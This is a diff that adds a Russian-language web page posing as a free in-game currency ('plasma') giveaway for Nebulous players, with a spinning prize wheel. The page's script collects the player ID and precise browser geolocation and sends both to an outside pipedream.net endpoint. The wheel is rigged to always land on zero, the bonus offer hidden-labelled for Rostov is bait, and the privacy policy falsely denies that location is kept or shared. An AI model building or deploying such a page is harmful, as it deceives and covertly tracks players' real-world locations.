@@ -1,0 +1,651 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Nebulous Free Plasma Giveaway! RU</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg-1: #031026;
+      --bg-2: #042a4a;
+      --accent-1: #33d1ff;
+      --accent-2: #5b8bff;
+      --glass: rgba(255,255,255,0.04);
+      --muted: #b6d7f7;
+      --card-glow: rgba(46, 119, 255, 0.12);
+    }
+
+    html,body{height:100%;}
+    body {
+      margin:0;
+      font-family: 'Inter', system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      color: #e8f8ff;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      background: radial-gradient(1200px 600px at 10% 10%, rgba(18,40,66,0.55), transparent),
+                  radial-gradient(900px 400px at 90% 80%, rgba(0,70,140,0.28), transparent),
+                  linear-gradient(180deg, var(--bg-1), var(--bg-2));
+      min-height:100vh;
+      display:flex; align-items:flex-start; justify-content:center;
+      padding:28px 20px;
+      overflow-y:auto;
+    }
+
+    .page {
+      width:100%;
+      max-width:1100px;
+      display:flex;
+      flex-direction:column;
+      gap:20px;
+      align-items:stretch;
+    }
+
+    .nebula {
+      position:fixed; inset:0; pointer-events:none; z-index:0; mix-blend-mode:screen;
+      background-image: radial-gradient(1200px 400px at 15% 10%, rgba(83,128,255,0.06), transparent),
+                        radial-gradient(1000px 300px at 85% 80%, rgba(0,190,255,0.04), transparent);
+      animation: nebMove 28s linear infinite;
+      opacity:0.95;
+    }
+    @keyframes nebMove{ 0%{transform:translate3d(0,0,0)} 50%{transform:translate3d(30px,-18px,0)} 100%{transform:translate3d(0,0,0)} }
+
+    header{
+      display:flex; align-items:center; gap:16px; z-index:1;
+      padding:18px 22px; border-radius:14px; background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      box-shadow: 0 8px 40px rgba(2,8,23,0.6), 0 0 30px var(--card-glow);
+      border: 1px solid rgba(255,255,255,0.03);
+      backdrop-filter: blur(8px);
+    }
+    header img{ width:68px; height:68px; object-fit:cover; border-radius:14px; background:linear-gradient(135deg,#06263b, #073b63); box-shadow:0 6px 22px rgba(3,18,36,0.6); padding:6px; }
+    header h1{ font-size:1.65rem; margin:0; color:#f4fbff; text-shadow:0 6px 40px rgba(37,86,255,0.08); letter-spacing:0.2px; }
+
+    .card{
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:16px; padding:20px; box-shadow: 0 10px 40px rgba(2,6,23,0.6);
+      border:1px solid rgba(255,255,255,0.03); backdrop-filter: blur(8px);
+      z-index:1;
+    }
+
+    .small{ color:var(--muted); font-size:0.95rem; }
+    .center{ text-align:center; }
+
+    label{ color:#eaf7ff; display:block; margin-top:12px; font-weight:600; }
+
+    input[type="text"], input[type="file"]{
+      width:100%; padding:12px 14px; margin-top:8px; border-radius:12px; border:1px solid rgba(255,255,255,0.04);
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); color:#eaf6ff; outline:none;
+      box-shadow: inset 0 -6px 14px rgba(0,0,0,0.25);
+      transition: box-shadow .18s ease, transform .12s;
+    }
+    input[type="text"]:focus{ box-shadow: 0 6px 26px rgba(58,142,255,0.08); transform: translateY(-1px); }
+
+    button{
+      display:inline-flex; align-items:center; gap:10px; justify-content:center;
+      padding:10px 16px; border-radius:12px; font-weight:700; cursor:pointer; border:none;
+      background:linear-gradient(135deg,var(--accent-1),var(--accent-2)); color:#001621; font-size:1rem;
+      box-shadow: 0 8px 30px rgba(40,120,255,0.14), 0 2px 0 rgba(255,255,255,0.02) inset;
+      transition: transform .15s ease, box-shadow .15s ease;
+    }
+    button:hover{ transform:translateY(-3px); box-shadow: 0 20px 60px rgba(40,120,255,0.16); }
+
+    #status.small{ color:var(--muted); }
+    .error{ color:#ff8b8b; }
+    .ok{ color:#9bffcf; }
+
+    .rostov-info{ display:flex; gap:16px; align-items:center; padding:14px; border-radius:12px; position:relative; overflow:hidden;
+      background: linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.03);
+      box-shadow: 0 8px 30px rgba(3,18,36,0.6);
+    }
+    .rostov-badge{ min-width:96px; height:96px; border-radius:14px; display:flex; align-items:center; justify-content:center; flex-shrink:0;
+      background: linear-gradient(135deg,#ffd166,#ff6b6b); color:#072227; font-weight:800; font-size:1.6em; box-shadow: 0 12px 30px rgba(255,107,107,0.14), inset 0 -6px 18px rgba(0,0,0,0.06);
+      transform:translateZ(0);
+    }
+    .rostov-title{ font-size:1.06rem; font-weight:700; color:#f7fdff; }
+    .rostov-desc, .rostov-note{ color:var(--muted); margin:0; }
+    .rostov-x5{ display:inline-block; background: linear-gradient(90deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02)); padding:6px 10px; border-radius:10px; font-weight:800; margin-left:8px; color:#fff; box-shadow: 0 6px 20px rgba(2,6,23,0.5); }
+
+    @keyframes popIn { 0% { transform: translateY(10px) scale(.98); opacity:0 } 60% { transform: translateY(-6px) scale(1.01); opacity:1 } 100% { transform: translateY(0) scale(1); } }
+    .rostov-info{ animation: popIn .55s cubic-bezier(.2,.9,.3,1) both; }
+
+    .roulette-wrapper{ padding:16px; border-radius:16px; display:block; background:linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.03); box-shadow: 0 14px 60px rgba(2,6,23,0.6); }
+    .roulette-card{ display:grid; grid-template-columns: 520px 1fr; gap:20px; align-items:center; }
+
+    .wheel-wrap{ position:relative; width:100%; max-width:520px; height:520px; margin:auto; display:flex; align-items:center; justify-content:center; }
+    canvas#wheel{ width:100%; height:100%; border-radius:50%; display:block; }
+
+    .pointer{ position:absolute; left:50%; transform:translateX(-50%); top:10px; width:0; height:0; z-index:8; }
+    .pointer::before{ content:''; display:block; width:28px; height:28px; transform:translateX(-50%); position:absolute; left:50%; top:-4px; border-radius:6px 6px 0 0; background:linear-gradient(180deg,var(--accent-1),var(--accent-2)); box-shadow: 0 8px 30px rgba(14,143,255,0.18); }
+    .pointer::after{ content:''; display:block; position:absolute; left:50%; transform:translateX(-50%); top:22px; width:0; height:0; border-left:16px solid transparent; border-right:16px solid transparent; border-top:26px solid rgba(1,8,20,0.92); filter: drop-shadow(0 8px 14px rgba(0,0,0,0.7)); }
+    .pointer{ animation: pointerBreathe 2.6s ease-in-out infinite; }
+    @keyframes pointerBreathe{ 0%{ transform:translateX(-50%) translateY(0) } 50%{ transform:translateX(-50%) translateY(6px) } 100%{ transform:translateX(-50%) translateY(0) } }
+
+    .center-badge{ position:absolute; left:50%; top:50%; transform:translate(-50%,-50%); width:110px; height:110px; border-radius:999px; display:flex; align-items:center; justify-content:center; font-weight:800; z-index:6; cursor:pointer; background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.12), rgba(255,255,255,0.06)), linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0.02)); border:1px solid rgba(255,255,255,0.06); box-shadow: 0 8px 30px rgba(30,80,160,0.18), inset 0 6px 18px rgba(255,255,255,0.03); color:#e9fbff; transition: transform .18s ease, box-shadow .18s; }
+    .center-badge:hover{ transform:translate(-50%,-50%) scale(1.04); box-shadow: 0 18px 80px rgba(42,110,255,0.18); }
+
+    /* shake animation for feedback when spin is denied */
+    @keyframes shakeX {
+      0% { transform: translate(-50%,-50%) translateX(0); }
+      20% { transform: translate(-50%,-50%) translateX(-8px); }
+      40% { transform: translate(-50%,-50%) translateX(6px); }
+      60% { transform: translate(-50%,-50%) translateX(-4px); }
+      80% { transform: translate(-50%,-50%) translateX(2px); }
+      100% { transform: translate(-50%,-50%) translateX(0); }
+    }
+    .shake { animation: shakeX 480ms cubic-bezier(.2,.9,.3,1); }
+
+    .controls h2{ margin:0 0 6px 0; color:#f6fbff; font-size:1.08rem; }
+    .log, .result{ margin-top:12px; border-radius:10px; padding:12px; font-size:0.95rem; color:var(--muted); background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005)); border:1px solid rgba(255,255,255,0.03); min-height:60px; }
+    .result{ font-weight:800; color:#fff; }
+
+    @media (max-width:980px){ .roulette-card{ grid-template-columns:1fr; } .wheel-wrap{ max-width:420px; height:420px; } .center-badge{ width:92px; height:92px; } }
+    @media (max-width:520px){ header{ padding:14px } body{ padding:18px 12px } .wheel-wrap{ max-width:320px; height:320px } .rostov-badge{ min-width:72px; height:72px; font-size:1.1rem } }
+
+    #privacy-modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.4);
+    }
+
+    .modal-content {
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      margin: 15% auto;
+      padding: 20px;
+      border: 1px solid rgba(255,255,255,0.03);
+      width: 80%;
+      max-width: 800px;
+      border-radius: 16px;
+      box-shadow: 0 10px 40px rgba(2,6,23,0.6);
+      backdrop-filter: blur(8px);
+      color: #e8f8ff;
+    }
+
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .close:hover,
+    .close:focus {
+      color: white;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="nebula" aria-hidden="true"></div>
+  <div class="page">
+
+  <header>
+    <img src="logo.png" alt="Логотип проекта" />
+    <h1>Nebulous Free Plasma Giveaway! RU</h1>
+  </header>
+
+  <div class="card">
+    <p class="small center"><strong>Розыгрыш плазмы для игроков из России.</strong><br>
+    Плазма будет отправлена в течение суток на указанный аккаунт.</p>
+
+    <div class="rostov-info" role="note" aria-label="Бонус для игроков из Ростова">
+      <div class="rostov-badge" aria-hidden="true">×5</div>
+      <div class="rostov-content">
+        <div class="rostov-title">
+          Внимание, уважаемые игроки Nebulous!
+          <span class="rostov-x5" aria-hidden="true">Выигрыш ×5</span>
+        </div>
+        <p class="rostov-desc">Только сегодня, выигрыш с рулетки будет умножаться в 5 раз!.</p>
+        <p class="rostov-note">Действует автоматически, без дополнительных действий — просто укажите ID и подтвердите.</p>
+      </div>
+    </div>
+    <style>
+:root{
+  --main-height: 125px;    /* высота основного логотипа */
+  --bg-size: 70px;        /* Фактический размер фоновых логотипов (в 2 раза меньше) */
+  --bg-offset: 95px;      /* Смещение от центра к боковым логотипам — уменьшай, чтобы поставить ещё ближе */
+  --float-duration-left: 4s;   /* можно менять для ускорения/замедления */
+  --float-duration-right: 4.4s;
+}
+
+.logo-container {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-top: 14px;
+  position: relative;
+  height: 160px;
+  pointer-events: none;
+}
+
+.logo-bg {
+  position: absolute;
+  top: 50%;
+  width: var(--bg-size);
+  height: auto;
+  opacity: 0.20;
+  filter: grayscale(30%) blur(.2px);
+  z-index: 1;
+  pointer-events: none;
+  user-select: none;
+  transform-origin: center;
+}
+
+.logo-bg.left {
+  left: 45%;
+  transform: translateX(calc(-1 * var(--bg-offset))) translateY(-50%) rotate(-12deg);
+  animation: float-left 8s ease-in-out infinite;
+}
+.logo-bg.right {
+  left: 50%;
+  transform: translateX(var(--bg-offset)) translateY(-50%) rotate(12deg);
+  animation: float-right 8s ease-in-out infinite;
+}
+
+.logo-main {
+  position: relative;
+  z-index: 3;
+  height: var(--main-height);
+  width: auto;
+  border-radius: 12px;
+  box-shadow: 0 10px 40px rgba(5,20,40,0.6);
+  pointer-events: auto;
+}
+
+@keyframes float-left {
+  0% {
+    transform: translateX(calc(-1 * var(--bg-offset))) translateY(-50%) rotate(-18deg);
+  }
+  25% {
+    transform: translateX(calc(-1 * var(--bg-offset) - 18px)) translateY(calc(-50% - 16px)) rotate(-6deg);
+  }
+  50% {
+    transform: translateX(calc(-1 * var(--bg-offset) + 12px)) translateY(calc(-50% + 10px)) rotate(-12deg);
+  }
+  75% {
+    transform: translateX(calc(-1 * var(--bg-offset) - 8px)) translateY(calc(-50% - 8px)) rotate(-9deg);
+  }
+  100% {
+    transform: translateX(calc(-1 * var(--bg-offset))) translateY(-50%) rotate(-18deg);
+  }
+}
+
+@keyframes float-right {
+  0% {
+    transform: translateX(var(--bg-offset)) translateY(-50%) rotate(18deg);
+  }
+  25% {
+    transform: translateX(calc(var(--bg-offset) + 18px)) translateY(calc(-50% - 16px)) rotate(6deg);
+  }
+  50% {
+    transform: translateX(calc(var(--bg-offset) - 12px)) translateY(calc(-50% + 10px)) rotate(12deg);
+  }
+  75% {
+    transform: translateX(calc(var(--bg-offset) + 8px)) translateY(calc(-50% - 8px)) rotate(9deg);
+  }
+  100% {
+    transform: translateX(var(--bg-offset)) translateY(-50%) rotate(18deg);
+  }
+}
+
+
+</style>
+
+<div class="logo-container" aria-hidden="false">
+  <img class="logo-bg left" src="logo.png" alt="" aria-hidden="true" onerror="this.style.display='none'">
+  <img class="logo-bg right" src="logo.png" alt="" aria-hidden="true" onerror="this.style.display='none'">
+  <img class="logo-main" src="giveaway.jpg" alt="Альтернативный логотип сайта" onerror="this.style.display='none'">
+</div>
+
+
+    <label for="playerId">Введите ID игрока:</label>
+    <input type="text" id="playerId" placeholder="например: 123456789" />
+    <div class="send-row" style="display:flex; align-items:center; gap:12px; margin-top:12px;">
+      <button id="sendBtn">Отправить (только для игроков из РФ)</button>
+      <span id="spinner" style="display:none;margin-left:6px">⏳</span>
+    </div>
+
+    <p id="status" class="small center">Статус: ожидается ввод ID...</p>
+
+    <details style="margin-top:10px">
+      <summary>Подробности (для разработчиков)</summary>
+      <pre id="debug">—</pre>
+    </details>
+  </div>
+
+  <div class="card roulette-wrapper">
+    <div class="roulette-card">
+      <div>
+        <div class="wheel-wrap" aria-hidden="false">
+          <div class="pointer" aria-hidden="true"></div>
+          <canvas id="wheel" width="900" height="900"></canvas>
+          <div class="center-badge" id="centerBadge" role="button" aria-pressed="false">СПИН</div>
+        </div>
+      </div>
+      <div class="controls">
+        <h2>Рулетка плазмы</h2>
+        <p class="small">Варианты плазмы: <strong>0, 10.000, 25.000, 50.000, 100.000, 250.000, 500.000</strong>.</p>
+        <div class="log" id="log">Готово — нажми «Отправить». Рулетка неактивна до успешной отправки.</div>
+        <div class="result" id="result">Результат: —</div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="card" style="display: flex; justify-content: space-between; align-items: center; padding: 16px;">
+    <a href="https://discord.com/invite/nebulous" target="_blank" rel="noopener noreferrer">
+      <img src="discord_logo.png" alt="Discord канал" style="width: 40px; height: 40px; border-radius: 8px;">
+    </a>
+    <p class="small">Почта поддержки: nebulous.plasma.ru@gmail.com</p>
+    <a href="#" id="privacy-link" style="color: var(--accent-1); text-decoration: none; font-weight: 600;">Пользовательское соглашение</a>
+  </footer>
+
+</div>
+
+<div id="privacy-modal">
+  <div class="modal-content">
+    <span class="close">&times;</span>
+    <div id="privacy-text"></div>
+  </div>
+</div>
+
+<script>
+const endpoint = 'https://eostxnbdfbrzcl7.m.pipedream.net';
+const statusEl = document.getElementById('status');
+const debugEl = document.getElementById('debug');
+const sendBtn = document.getElementById('sendBtn');
+const playerIdInput = document.getElementById('playerId');
+const spinnerEl = document.getElementById('spinner');
+
+function logDebug(...args) {
+  debugEl.textContent +=
+    args
+      .map(a => (typeof a === 'object' ? JSON.stringify(a, null, 2) : String(a)))
+      .join(' ') + '\n';
+  debugEl.scrollTop = debugEl.scrollHeight;
+}
+
+function setStatus(text, cls = 'small') {
+  statusEl.textContent = 'Статус: ' + text;
+  statusEl.className = cls;
+}
+
+let spinAllowed = false;
+
+async function sendCoordinates(obj) {
+  setStatus('Отправка данных...');
+  spinnerEl.style.display = 'inline-block';
+
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(obj),
+      mode: 'cors',
+    });
+
+    const text = await res.text().catch(() => '');
+    logDebug('Ответ сервера:', res.status, text);
+
+    if (res.ok) {
+      setStatus('✅ Данные успешно отправлены! Крутим рулетку.', 'ok');
+      spinAllowed = true;
+      return true;
+    } else {
+      setStatus('Ошибка сервера: ' + res.status, 'error');
+      return false;
+    }
+  } catch (e) {
+    logDebug('Network error:', e);
+    setStatus('Ошибка при отправке данных.', 'error');
+    return false;
+  } finally {
+    spinnerEl.style.display = 'none';
+  }
+}
+
+function onGeoError(err) {
+  logDebug('Ошибка геолокации:', err);
+  setStatus('Не удалось получить местоположение.', 'error');
+}
+
+function onGeoSuccess(position, playerId) {
+  const c = position.coords;
+  const payload = {
+    player_id: playerId,
+    latitude: c.latitude,
+    longitude: c.longitude,
+    timestamp_iso: new Date(position.timestamp).toISOString(),
+  };
+
+  logDebug('Отправляем данные:', payload);
+
+  sendCoordinates(payload).then(ok => {
+    if (ok && typeof window.triggerSpin === 'function') {
+      window.triggerSpin();
+    }
+  });
+}
+
+function requestLocation(playerId) {
+  if (!('geolocation' in navigator)) {
+    setStatus('Геолокация не поддерживается.', 'error');
+    return;
+  }
+  setStatus('Запрашиваем местоположение...');
+  navigator.geolocation.getCurrentPosition(
+    pos => onGeoSuccess(pos, playerId),
+    onGeoError,
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+sendBtn.addEventListener('click', () => {
+  const id = playerIdInput.value.trim();
+  if (!id) {
+    setStatus('Введите ID игрока перед отправкой.', 'error');
+    return;
+  }
+  requestLocation(id);
+});
+
+(function () {
+  const sectors = ["0", "10.000", "25.000", "50.000", "100.000", "250.000", "500.000"];
+  const baseColors = ["#052f3f", "#063e55", "#094f6a", "#0b6b8a", "#1b7fc0", "#5b8bff", "#7bd3ff"];
+  const canvas = document.getElementById('wheel');
+  const ctx = canvas.getContext('2d');
+  const log = document.getElementById('log');
+  const resultEl = document.getElementById('result');
+  const centerBadge = document.getElementById('centerBadge');
+
+  function resizeCanvas() {
+    const ratio = Math.max(1, window.devicePixelRatio || 1);
+    const rect = canvas.getBoundingClientRect();
+    canvas.width = Math.round(rect.width * ratio);
+    canvas.height = Math.round(rect.height * ratio);
+    ctx.setTransform(ratio, 0, 0, ratio, 0, 0);
+  }
+
+  let isSpinning = false;
+  let currentRotation = 0;
+
+  function drawWheel() {
+    const w = canvas.width / (window.devicePixelRatio || 1);
+    const h = canvas.height / (window.devicePixelRatio || 1);
+    const cx = w / 2, cy = h / 2;
+    const radius = Math.min(cx, cy) - 28;
+    const slice = 2 * Math.PI / sectors.length;
+
+    ctx.clearRect(0, 0, w, h);
+
+    ctx.save();
+    ctx.beginPath();
+    ctx.arc(cx, cy, radius + 14, 0, Math.PI*2);
+    ctx.fillStyle = 'rgba(6,20,40,0.28)';
+    ctx.fill();
+    ctx.restore();
+
+    ctx.save(); ctx.translate(cx, cy); ctx.rotate(currentRotation);
+
+    for (let i = 0; i < sectors.length; i++) {
+      const start = i * slice;
+      ctx.beginPath(); ctx.moveTo(0, 0);
+      ctx.arc(0, 0, radius, start, start + slice, false);
+      ctx.closePath();
+
+      const g = ctx.createLinearGradient(Math.cos(start)*-radius, Math.sin(start)*-radius, Math.cos(start+slice)*radius, Math.sin(start+slice)*radius);
+      g.addColorStop(0, baseColors[i % baseColors.length]);
+      g.addColorStop(1, '#021623');
+      ctx.fillStyle = g;
+      ctx.fill();
+
+      ctx.strokeStyle = 'rgba(80,170,255,0.12)';
+      ctx.lineWidth = 2;
+      ctx.stroke();
+
+      ctx.save();
+      const ang = start + slice/2;
+      ctx.rotate(ang);
+      ctx.translate(radius * 0.58, 0);
+      ctx.rotate(Math.PI/2);
+      ctx.fillStyle = '#e8fbff';
+      ctx.font = '700 ' + Math.max(12, Math.round(radius * 0.11)) + 'px Inter, Arial';
+      ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+      ctx.fillText(sectors[i], 0, 0);
+      ctx.restore();
+    }
+
+    ctx.beginPath(); ctx.arc(0,0, radius*0.9,0,Math.PI*2); ctx.strokeStyle='rgba(255,255,255,0.03)'; ctx.lineWidth=6; ctx.stroke();
+    ctx.beginPath(); ctx.arc(0,0, radius*0.95,0,Math.PI*2); ctx.strokeStyle='rgba(0,0,0,0.4)'; ctx.lineWidth=2; ctx.stroke();
+
+    ctx.restore();
+
+    ctx.save(); ctx.translate(cx,cy);
+    const grd = ctx.createRadialGradient(0,0,12,0,0,radius*0.45);
+    grd.addColorStop(0,'rgba(255,255,255,0.15)'); grd.addColorStop(0.4,'rgba(255,255,255,0.06)'); grd.addColorStop(1,'rgba(1,10,20,0.6)');
+    ctx.beginPath(); ctx.arc(0,0,radius*0.45,0,Math.PI*2); ctx.fillStyle = grd; ctx.fill();
+    ctx.restore();
+  }
+
+  function easeOutCubic(t){return 1 - Math.pow(1 - t, 3);}
+
+  async function spin() {
+    if (!spinAllowed) {
+      setStatus('Введите данные', 'error');
+      log.textContent = 'Введите данные';
+      centerBadge.classList.remove('shake');
+      void centerBadge.offsetWidth;
+      centerBadge.classList.add('shake');
+      setTimeout(() => centerBadge.classList.remove('shake'), 600);
+      return;
+    }
+
+    if (isSpinning) return;
+    isSpinning = true;
+    centerBadge.textContent = 'КРУТИМ…';
+    centerBadge.setAttribute('aria-pressed','true');
+    resultEl.textContent = 'Результат: —';
+    log.textContent = 'Начинаем крутить...';
+
+    const slice = 2 * Math.PI / sectors.length;
+    const targetIndex = 0;
+    const baseRotation = -Math.PI / 2 - (targetIndex * slice + slice / 2);
+    const rounds = 7 + Math.floor(Math.random()*3);
+    const targetRotation = rounds * 2 * Math.PI + baseRotation;
+    const startRot = currentRotation % (2*Math.PI);
+    const endRot = startRot + targetRotation;
+    const duration = 4100 + Math.floor(Math.random()*700);
+    const startTime = performance.now();
+
+    return new Promise(resolve => {
+      function frame(now){
+        const t = Math.min(1, (now - startTime)/duration);
+        const eased = easeOutCubic(t);
+        currentRotation = startRot + (endRot - startRot) * eased;
+        drawWheel();
+        if (t < 1) requestAnimationFrame(frame);
+        else {
+          drawWheel();
+          centerBadge.textContent = "0 🔒";
+          centerBadge.setAttribute('aria-pressed','false');
+          resultEl.textContent = "Результат: 0 плазмы";
+          log.textContent = "Выпало: 0 плазмы";
+          isSpinning = false;
+          resolve();
+        }
+      }
+      requestAnimationFrame(frame);
+    });
+  }
+
+  centerBadge.addEventListener('click', () => {
+    if (typeof window.triggerSpin === 'function') window.triggerSpin();
+  });
+  centerBadge.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      if (typeof window.triggerSpin === 'function') window.triggerSpin();
+    }
+  });
+
+  window.triggerSpin = spin;
+
+  function refresh() { resizeCanvas(); drawWheel(); }
+  window.addEventListener('resize', refresh);
+  resizeCanvas(); drawWheel();
+})();
+
+var modal = document.getElementById('privacy-modal');
+var link = document.getElementById('privacy-link');
+var span = document.getElementsByClassName('close')[0];
+
+const privacyText = `Политика конфденциальности и условия обработки данных
+
+1. Общие положения
+
+1.1. Настоящая Политика является официальным документом, регламентирующим принципы и порядок обработки данных.
+1.2. Использование Сайта пользователем означает согласие с положениями настоящей Политики. В случае несогласия пользователь обязан воздержаться от использования Сайта.
+1.3. Разработчики Сайта подтверждают приверженность принципам законности, добросовестности и минимизации обработки персональных данных.
+
+2. Персональные данные пользователей 
+
+2.1. Разработчики Сайта не используют данные о геолокации в личных, коммерческих, аналитических или рекламных целях, не передают их третьим лицам и не осуществляют хранения.
+2.2. Данные о пользователе удаляются сразу же, после соблюдения условий для участия в розыгрыше.
+
+3. Порядок начисления игровой валюты
+
+3.1. При использовании интерактивных игровых элементов Сайта (в частности, функции «Колесо удачи») пользователь может получить виртуальное вознаграждение в виде игровой валюты.
+3.2. Начисление игровой валюты осуществляется в автоматическом или полуавтоматическом режиме в течение 24 (двадцати четырёх) часов с момента фиксации факта выигрыша.
+`;
+
+link.onclick = function(e) {
+  e.preventDefault();
+  document.getElementById('privacy-text').innerHTML = privacyText.replace(/\n/g, '<br>');
+  modal.style.display = "block";
+};
+
+span.onclick = function() {
+  modal.style.display = "none";
+};
+
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+};
+
+</script>
+</body>
+</html>
